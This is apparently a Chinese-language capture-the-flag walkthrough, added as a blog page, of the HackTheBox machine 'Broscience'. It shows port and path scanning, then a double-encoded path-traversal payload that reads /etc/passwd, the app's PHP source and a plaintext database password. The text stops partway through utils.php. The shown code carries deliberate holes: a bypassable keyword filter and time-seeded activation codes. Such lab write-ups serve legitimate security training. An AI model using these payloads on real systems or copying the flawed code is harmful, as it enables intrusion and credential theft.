@@ -1,0 +1,598 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+<meta name="referrer" content="no-referrer" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/logo_icon.svg">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/logo_icon.svg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo_icon.svg">
+  <link rel="mask-icon" href="/images/logo_icon.svg" color="#222">
+  <link rel="manifest" href="/images/logo_icon.svg">
+  <meta name="msapplication-config" content="/images/logo_icon.svg">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=consolas:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoloyolo.top","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="日常记录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox_Broscience">
+<meta property="og:url" content="https://yoloyolo.top/2023/03/24/HackTheBox-Broscience/index.html">
+<meta property="og:site_name" content="xXxYOLOxXx">
+<meta property="og:description" content="日常记录">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-03-23T17:54:02.000Z">
+<meta property="article:modified_time" content="2023-03-23T18:07:19.041Z">
+<meta property="article:author" content="xXxYOLOxXx">
+<meta property="article:tag" content="Pentest">
+<meta property="article:tag" content="HackTheBox">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://yoloyolo.top/2023/03/24/HackTheBox-Broscience/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>HackTheBox_Broscience | xXxYOLOxXx</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><link rel="alternate" href="/atom.xml" title="xXxYOLOxXx" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">xXxYOLOxXx</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">xXxYOLOxXx</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="links fa-fw"></i>Links</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://yoloyolo.top/2023/03/24/HackTheBox-Broscience/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="xXxYOLOxXx">
+      <meta itemprop="description" content="Explorer for unknown.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xXxYOLOxXx">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HackTheBox_Broscience
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-03-24 01:54:02 / Modified: 02:07:19" itemprop="dateCreated datePublished" datetime="2023-03-24T01:54:02+08:00">2023-03-24</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WriteUp/" itemprop="url" rel="index"><span itemprop="name">WriteUp</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>日常记录</p>
+<a id="more"></a>
+<h1 id="hackthebox_broscience"><a class="markdownIt-Anchor" href="#hackthebox_broscience"></a> HackTheBox_Broscience</h1>
+<h2 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h2>
+<h3 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV -T5 -v 10.10.11.195</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.195</span><br><span class="line">Host is up (0.60s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT	STATE SERVICE  VERSION</span><br><span class="line">22&#x2F;tcp  open  ssh	  OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span><br><span class="line">80&#x2F;tcp  open  http	 Apache httpd 2.4.54</span><br><span class="line">443&#x2F;tcp open  ssl&#x2F;http Apache httpd 2.4.54 ((Debian))</span><br><span class="line">Service Info: Host: broscience.htb; OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+<h3 id="路径枚举"><a class="markdownIt-Anchor" href="#路径枚举"></a> 路径枚举</h3>
+<p>查看域名</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -I 10.10.11.195</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">Date: Thu, 23 Mar 2023 11:11:56 GMT</span><br><span class="line">Server: Apache&#x2F;2.4.54 (Debian)</span><br><span class="line">Location: https:&#x2F;&#x2F;broscience.htb&#x2F;</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;iso-8859-1</span><br></pre></td></tr></table></figure>
+<p>添加域名解析</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;10.10.11.195\tbroscience.htb&#x27;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
+<p>枚举路径</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb https://broscience.htb/</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: https:&#x2F;&#x2F;broscience.htb&#x2F;images&#x2F;																	   </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: https:&#x2F;&#x2F;broscience.htb&#x2F;includes&#x2F;</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: https:&#x2F;&#x2F;broscience.htb&#x2F;manual&#x2F;</span><br></pre></td></tr></table></figure>
+<p>枚举PHP文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb https://broscience.htb/ -X .php</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+ https:&#x2F;&#x2F;broscience.htb&#x2F;activate.php (CODE:200|SIZE:1256)														  </span><br><span class="line">+ https:&#x2F;&#x2F;broscience.htb&#x2F;comment.php (CODE:302|SIZE:13)															 </span><br><span class="line">+ https:&#x2F;&#x2F;broscience.htb&#x2F;index.php (CODE:200|SIZE:9304)															 </span><br><span class="line">+ https:&#x2F;&#x2F;broscience.htb&#x2F;login.php (CODE:200|SIZE:1936)															 </span><br><span class="line">+ https:&#x2F;&#x2F;broscience.htb&#x2F;logout.php (CODE:302|SIZE:0)															   </span><br><span class="line">+ https:&#x2F;&#x2F;broscience.htb&#x2F;register.php (CODE:200|SIZE:2161)														  </span><br><span class="line">+ https:&#x2F;&#x2F;broscience.htb&#x2F;user.php (CODE:200|SIZE:1309)</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h2>
+<p>访问主页，存在链接<code>https://broscience.htb/includes/img.php?path=bench.png</code></p>
+<p>构造LFI</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;https://broscience.htb/includes/img.php?path=..%252f..%252f..%252f..%252fetc%252fpasswd&#x27;</span> --insecure </span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:100:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-network:x:101:102:systemd Network Management,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-resolve:x:102:103:systemd Resolver,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tss:x:103:109:TPM software stack,,,:&#x2F;var&#x2F;lib&#x2F;tpm:&#x2F;bin&#x2F;false</span><br><span class="line">messagebus:x:104:110::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:105:111:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">usbmux:x:106:46:usbmux daemon,,,:&#x2F;var&#x2F;lib&#x2F;usbmux:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">rtkit:x:107:115:RealtimeKit,,,:&#x2F;proc:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sshd:x:108:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">dnsmasq:x:109:65534:dnsmasq,,,:&#x2F;var&#x2F;lib&#x2F;misc:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">avahi:x:110:116:Avahi mDNS daemon,,,:&#x2F;run&#x2F;avahi-daemon:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">speech-dispatcher:x:111:29:Speech Dispatcher,,,:&#x2F;run&#x2F;speech-dispatcher:&#x2F;bin&#x2F;false</span><br><span class="line">pulse:x:112:118:PulseAudio daemon,,,:&#x2F;run&#x2F;pulse:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">saned:x:113:121::&#x2F;var&#x2F;lib&#x2F;saned:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">colord:x:114:122:colord colour management daemon,,,:&#x2F;var&#x2F;lib&#x2F;colord:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">geoclue:x:115:123::&#x2F;var&#x2F;lib&#x2F;geoclue:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">Debian-gdm:x:116:124:Gnome Display Manager:&#x2F;var&#x2F;lib&#x2F;gdm3:&#x2F;bin&#x2F;false</span><br><span class="line">bill:x:1000:1000:bill,,,:&#x2F;home&#x2F;bill:&#x2F;bin&#x2F;bash</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">postgres:x:117:125:PostgreSQL administrator,,,:&#x2F;var&#x2F;lib&#x2F;postgresql:&#x2F;bin&#x2F;bash</span><br><span class="line">_laurel:x:998:998::&#x2F;var&#x2F;log&#x2F;laurel:&#x2F;bin&#x2F;false</span><br></pre></td></tr></table></figure>
+<p>查看<code>broscience.htb/includes/img.php</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;https://broscience.htb/includes/img.php?path=..%252fincludes/img.php&#x27;</span> --insecure </span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>])) &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;&lt;b&gt;Error:&lt;/b&gt; Missing \&#x27;path\&#x27; parameter.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check for LFI attacks</span></span><br><span class="line"><span class="variable">$path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$badwords</span> = <span class="keyword">array</span>(<span class="string">&quot;../&quot;</span>, <span class="string">&quot;etc/passwd&quot;</span>, <span class="string">&quot;.ssh&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$badwords</span> <span class="keyword">as</span> <span class="variable">$badword</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> (strpos(<span class="variable">$path</span>, <span class="variable">$badword</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;&lt;b&gt;Error:&lt;/b&gt; Attack detected.&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Normalize path</span></span><br><span class="line"><span class="variable">$path</span> = urldecode(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return the image</span></span><br><span class="line">header(<span class="string">&#x27;Content-Type: image/png&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;/var/www/html/images/&#x27;</span> . <span class="variable">$path</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>查看<code>broscience.htb/includes/</code>路径下文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;https://broscience.htb/includes/&#x27;</span> --insecure </span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">db_connect.php</span><br><span class="line">header.php</span><br><span class="line">img.php</span><br><span class="line">navbar.php</span><br><span class="line">utils.php</span><br></pre></td></tr></table></figure>
+<p>查看<code>broscience.htb/includes/db_connect.php</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;https://broscience.htb/includes/img.php?path=..%252fincludes/db_connect.php&#x27;</span> --insecure</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$db_host</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$db_port</span> = <span class="string">&quot;5432&quot;</span>;</span><br><span class="line"><span class="variable">$db_name</span> = <span class="string">&quot;broscience&quot;</span>;</span><br><span class="line"><span class="variable">$db_user</span> = <span class="string">&quot;dbuser&quot;</span>;</span><br><span class="line"><span class="variable">$db_pass</span> = <span class="string">&quot;RangeOfMotion%777&quot;</span>;</span><br><span class="line"><span class="variable">$db_salt</span> = <span class="string">&quot;NaCl&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$db_conn</span> = pg_connect(<span class="string">&quot;host=<span class="subst">&#123;$db_host&#125;</span> port=<span class="subst">&#123;$db_port&#125;</span> dbname=<span class="subst">&#123;$db_name&#125;</span> user=<span class="subst">&#123;$db_user&#125;</span> password=<span class="subst">&#123;$db_pass&#125;</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$db_conn</span>) &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;&lt;b&gt;Error&lt;/b&gt;: Unable to connect to database&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>得到postgresql数据库登陆凭证</p>
+<p>查看<code>broscience.htb/register.php</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;https://broscience.htb/includes/img.php?path=..%252fregister.php&#x27;</span> --insecure</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$activation_code</span> = generate_activation_code();</span><br><span class="line"><span class="variable">$activation_link</span> = <span class="string">&quot;https://broscience.htb/activate.php?code=<span class="subst">&#123;$activation_code&#125;</span>&quot;</span>;</span><br><span class="line"><span class="variable">$res</span> = pg_execute(<span class="variable">$db_conn</span>, <span class="string">&quot;create_user_query&quot;</span>, <span class="keyword">array</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>], md5(<span class="variable">$db_salt</span> . <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]), <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>], <span class="variable">$activation_code</span>));</span><br></pre></td></tr></table></figure>
+<p>得到账户激活码生成函数名，激活码参数，以及用户创建语句</p>
+<p>查看<code>broscience.htb/includes/utils.php</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;https://broscience.htb/includes/img.php?path=..%252fincludes/utils.php&#x27;</span> --insecure</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate_activation_code</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$chars</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&quot;</span>;</span><br><span class="line">    srand(time());</span><br><span class="line">    <span class="variable">$activation_code</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">32</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$activation_code</span> = <span class="variable">$activation_code</span> . <span class="variable">$chars</span>[rand(<span class="number">0</span>, strlen(<span class="variable">$chars</span>) - <span class="number">1</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$activation_code</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Source: https://stackoverflow.com/a/4420773 (Slightly adapted)</span></span><br><span class="line"><span class="function"><span 